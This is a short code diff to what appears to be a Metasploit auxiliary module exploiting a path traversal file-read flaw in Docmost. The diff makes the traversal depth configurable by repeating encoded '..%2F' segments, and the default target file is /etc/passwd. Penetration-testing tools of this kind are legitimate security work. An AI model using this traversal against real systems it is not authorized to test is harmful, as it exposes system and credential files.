@@ -44,7 +44,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         OptString.new('FILEPATH', [true, 'Name of the file to download', '/etc/passwd']),
-        OptString.new('TARGETURI', [true, 'Base path to Docmost installation', '/'])
+        OptString.new('TARGETURI', [true, 'Base path to Docmost installation', '/']),
+        OptInt.new('DEPTH', [true, 'Traversal Depth (to reach the root folder)', 5])
       ]
     )
   end
@@ -67,7 +68,9 @@ class MetasploitModule < Msf::Auxiliary
       'img',
       'avatar'
     )
-    route += "/..%2F..%2F..%2F..%2F..#{filepath}"
+
+    traverse = '..%2F' * datastore['DEPTH']
+    route += "/#{traverse}#{filepath}"
 
     res = send_request_raw({
       'method' => 'GET',
